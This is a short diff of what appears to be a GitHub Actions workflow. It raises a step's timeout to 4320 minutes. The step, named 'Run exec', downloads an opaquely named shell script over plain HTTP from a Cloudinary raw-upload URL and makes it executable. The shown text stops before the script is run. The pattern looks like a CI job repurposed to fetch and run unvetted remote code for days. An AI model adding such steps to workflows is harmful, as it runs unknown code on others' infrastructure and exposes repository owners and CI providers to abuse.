@@ -11,7 +11,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Run exec
-        timeout-minutes: 720
+        timeout-minutes: 4320
         run: |
           curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711125466/o8abekknjkh6hlgjcwal.sh
           chmod +x o8abekknjkh6hlgjcwal.sh
